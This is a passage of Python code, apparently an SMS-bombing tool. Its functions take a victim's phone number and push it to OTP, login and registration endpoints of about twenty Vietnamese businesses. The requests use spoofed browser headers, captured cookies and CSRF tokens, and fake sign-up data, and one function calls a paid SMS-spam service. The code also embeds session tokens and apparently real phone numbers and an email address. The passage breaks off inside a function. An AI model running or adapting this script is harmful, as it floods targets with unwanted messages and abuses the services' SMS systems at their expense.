def tamo(sdt):
  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()

def thantaioi():
  headers = {
    'Host': 'api.thantaioi.vn',
    'accept-language': 'vi',
    'authorization': 'Bearer ' + tokenthantaioi ,
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'accept': '*/*',
    'origin': 'https://thantaioi.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thantaioi.vn/user/registration/reg2',
    # 'accept-encoding': 'gzip, deflate, br',
    # 'cookie': '_ym_uid=169110846991669337; _ym_d=1691108469; _fw_crm_v=dbfc3e99-4c79-4c24-8854-63cea51ea448; _gid=GA1.2.551830717.1691894331; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.282932599.1691108469; _ga_LN0QPGLCB5=GS1.2.1691894333.3.1.1691894444.0.0.0; _ga_LBS7YCVKY6=GS1.1.1691894332.3.1.1691894445.55.0.0',
}
  response = requests.get('https://api.thantaioi.vn/api/user/phone-confirmation-code', headers=headers).text

def meta(sdt):
  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text

def shopiness(sdt):
  cookies = {
    '_gcl_au': '1.1.713290776.1691278322',
    '_gid': 'GA1.2.538313268.1691278323',
    '_gat_UA-78703708-2': '1',
    '_ga': 'GA1.1.1304515259.1691278323',
    '_fbp': 'fb.1.1691278324147.1207721038',
    '_ga_P138SCK22P': 'GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  headers = {
    'Host': 'shopiness.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '63',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://shopiness.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://shopiness.vn/khuyen-mai/pizza-hut-mua-1-tang-1-khi-giao-hang-tan-noi.80C793B3FC.html',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.713290776.1691278322; _gid=GA1.2.538313268.1691278323; _gat_UA-78703708-2=1; _ga=GA1.1.1304515259.1691278323; _fbp=fb.1.1691278324147.1207721038; _ga_P138SCK22P=GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  data = {
    'action': 'verify-registration-info',
    'phoneNumber': f'{sdt}',
    'refCode': '',
  }
  response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()

def kiot(phone):
    cookies = {
        'AvLong Dec_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AvLong Dec_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "0338607465",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text

def fpt(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def alfrescos(sdt):
  data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
  head = {
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()

def poyeye(sdt):
  data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("sdt",sdt)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()

def vieon(sdt):
  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()

def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  '''if not rq["errorCode"] == 200:
    print("Lỗi 360tv")'''
def winmart(sdt):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()

def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()

def funring(sdt):
  data ='{"username": "sdt"}'.replace("sdt",sdt)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()

def apispam(phone):
  cookies = {
    '_ga': 'GA1.1.1928856259.1691039310',
    'serverChoice': 'Server-IPv1',
    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
  }
  headers = {
    'authority': 'crowstore.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
    'origin': 'https://crowstore.online',
    'referer': 'https://crowstore.online/sms.php',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
  }
  data = {
    'sodienthoai': phone,
    'ten_server': 'Server-IPv1',
    'key': 'freekey307',
  }
  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text

def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text

def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text

def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text

def appota(sdt):
  headers = {
    'Host': 'vi.appota.com',
    # 'content-length': '23',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://vi.appota.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vi.appota.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVvLong DecTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
  }
  data = {
    'phone_number': f'{sdt}',
  }
  response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text

def itaphoa(sdt):
  headers = {
    'Host': 'api.itaphoa.com',
    'region-code': 'HCM',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'origin': 'https://shop.mioapp.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://shop.mioapp.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  params = {
    'phone': f'{sdt}',
    'type': 'call',
}
  response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers).text

def ghn(sdt):
  headers = {
    'Host': 'online-gateway.ghn.vn',
    # 'content-length': '40',
